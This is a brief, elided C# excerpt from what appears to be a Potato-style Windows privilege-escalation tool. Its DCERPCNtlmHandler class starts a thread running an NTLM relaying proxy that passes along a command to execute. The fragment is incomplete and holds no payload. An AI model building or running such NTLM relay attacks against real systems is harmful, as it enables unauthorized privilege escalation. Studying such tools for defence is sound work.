...
namespace Potato
{
    class DCERPCNtlmHandler
    {
        ...
        public void start(String connectHost,String connectPort,String rpcHost,String rpcPort, bool dropFirst, String enable_token, String cmd)
        {
            ...
            while (!serviceStartSuccess)
            {
                ...
                Thread NTLMRelayingProxyThread = new Thread(() => relayProxy.startRelay(targetSock, winRpcSock, ntlmQueue, dropFirst, enable_token, cmd));
